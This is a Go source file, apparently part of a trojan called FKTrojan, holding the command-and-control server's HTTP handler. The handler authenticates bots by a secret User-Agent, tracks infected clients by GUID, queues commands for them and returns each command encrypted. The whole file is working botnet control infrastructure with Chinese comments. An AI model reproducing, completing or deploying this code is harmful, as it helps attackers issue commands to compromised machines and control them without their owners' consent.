//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"database/sql"
	"fmt"
	"net/http"
	"time"
)

//------------------------------------------------------------
// 从数据库返回command
func CommandHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		if request.UserAgent() == UserAgentKey {
			request.ParseForm()

			GUID := request.Form.Get("0")
			CHECK := request.Form.Get("1") // 检查这个命令是否是上一次的命令

			var tmpguid string
			var tmpcmd string
			var tmpdata string
			var id int
			var guid string

			err := DBPointer.QueryRow("SELECT guid FROM clients WHERE guid=?", GUID).Scan(&tmpguid)
			if err == sql.ErrNoRows {
				fmt.Fprintf(response, "spin") // 让客户端重新注册
			} else {
				err := DBPointer.QueryRow("SELECT id, guid, command, timeanddate FROM command WHERE guid=? and status=? limit 1", GUID, common.STATUS_NEW).Scan(&id, &guid, &tmpcmd, &tmpdata)

				// 没有命令执行，不需要重新注册
				if err != nil {
					fmt.Fprintf(response, "idle")
					return
				}
				//例如 UPDATE `clients` SET `lastcheckin` = 'Sunday, 06-Feb-18 01:08:11 EST', `lastcommand` = 'Not Completed...' WHERE `clients`.`guid` = '86b4f9e6-366b-47b0-ab4e-15c6cd2f7074';
				//_, err = DBPointer.Exec("UPDATE clients SET lastcommand='" + CHECK + "' WHERE guid='" + GUID + "'")
				_, err = DBPointer.Exec("UPDATE clients SET lastcommand=? WHERE guid=?", CHECK, GUID)
				if err != nil {
					fmt.Println(err)
					return
				}

				//_, err = DBPointer.Exec("UPDATE clients SET lastcheckin='" + time.Now().Format(time.RFC850) + "' WHERE guid='" + GUID + "'")
				_, err = DBPointer.Exec("UPDATE clients SET lastcheckin=? WHERE guid=?", time.Now().Format(time.RFC850), GUID)
				if err != nil {
					fmt.Println(err)
					return
				}
				cmd, err := common.ParseCommand(tmpdata + "||" + fmt.Sprintf("%d", id) + "|" + guid + "|" + tmpcmd)
				if err != nil {
					fmt.Println(err)
					return
				}
				_, err = DBPointer.Exec("UPDATE command SET status=? WHERE id=?", common.STATUS_DOING, id)
				if err != nil {
					fmt.Println(err)
					return
				}
				fmt.Fprintf(response, cmd.Encrypt())
			}
		}
	}
}

//------------------------------------------------------------
